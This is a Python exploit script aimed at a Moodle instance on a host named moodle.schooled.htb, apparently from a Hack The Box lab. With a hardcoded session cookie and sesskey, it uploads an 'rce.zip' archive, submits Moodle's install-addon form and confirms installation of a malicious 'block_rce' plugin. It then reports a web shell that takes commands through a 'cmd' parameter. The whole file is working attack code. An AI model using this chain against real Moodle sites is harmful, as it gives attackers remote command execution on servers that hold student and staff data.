import requests
from requests_toolbelt import MultipartEncoder

session = requests.Session()

#cookey = input("Please Enter your MoodleSession cookie: ")
#sesskey = input("Please Enter you session token: ")
#storage = input("Please enter you storage key: ")

cookey = "MoodleSession=8e9s8j1o2hjj9qil20e3eh6v7g"
sesskey = "P2O180H9Eh"
storage = "8f5e1997-29d0-4500-8ba7-f9ef615acbf4"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def upload():
    print("[+]Uploading...")

    url = ("http://moodle.schooled.htb/moodle/repository/repository_ajax.php?action=upload")


    data = MultipartEncoder(fields={ # Need to use MultiPart encoder to generate matching boundaries in the payload so the server can determine when the next filed starts and stops. 
        'repo_upload_file': ('rce.zip', open('/home/tom/Downloads/rce.zip','rb')),
        'sesskey':sesskey, # Needs a valid session token
        'repo_id':'5',
        'itemid':'932337023',
        'author':'Lianne Carter',
        'title':'rce.zip',
        'ctxid':'1',
        'accepted_types[]':'.zip'})


    headers = {
        'Host': 'moodle.schooled.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': data.content_type,
        'Content-Length': '1885',
        'Origin': 'http://moodle.schooled.htb',
        'Connection': 'close',
        'Referer': 'http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php',
        'Cookie': cookey}


    r = session.post(url, headers=headers, data=data, proxies=proxies) # Sending HTTP POST request with arguments and storing response in r
    
    if r.ok:
        print("[+]Upload Successful")
       # print(r.text) #Printing response from server
    else:
        print("[-]Error on Upload!")
        print(r.text)
            
def submit():
    print("[+]Submitting...")

    url = ("http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php")

    headers = {
        'Host': 'moodle.schooled.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '205',
        'Origin': 'http://moodle.schooled.htb',
        'Connection': 'close',
        'Referer': 'http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php',
        'Cookie': cookey,
        'Upgrade-Insecure-Requests': '1'}

    data = "sesskey="+sesskey+"&_qf__tool_installaddon_installfromzip_form=1&mform_showmore_id_general=0&mform_isexpanded_id_general=1&zipfile=789327299&plugintype=&rootdir=&submitbutton=Install+plugin+from+the+ZIP+file" #Needs valid session token. Find a way to automate this
    
    r = session.post(url, data=data, headers=headers, proxies=proxies) #Generating HTTP POST request with arguments
    
    if r.ok:
        print("[+]Submit Successful")
       # print(r.text)
    else:
        print("[-]Error on Submit!")
        print(r.text)

def btnClick():
    print("[+]Clicking Button...")

    url = ("http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php")

    headers = {
        'Host': 'moodle.schooled.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '123',
        'Origin': 'http://moodle.schooled.htb',
        'Connection': 'close',
        'Referer': 'http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php?installzipcomponent=block_rce&installzipstorage='+storage+'&sesskey='+sesskey, #Needs valid session token
        'Cookie': cookey,
        'Upgrade-Insecure-Requests': '1'}

    data = 'installzipcomponent=block_rce&installzipstorage='+storage+'&installzipconfirm=1&sesskey='+sesskey # Needs valid session token (find a way to grab this automatically)

    r = session.post(url, data=data, headers=headers, proxies=proxies) # Generating HTTP POST request with arguments
    
    if r.ok:
        print("[+]Button click Successful")
        print("[+]Payload uploaded at /moodle/blocks/rce/lang/en/block_rce?cmd=")
       # print(r.text)
    else:
        print("[-]Error on button click!")
        print(r.text)

upload()
submit()
btnClick()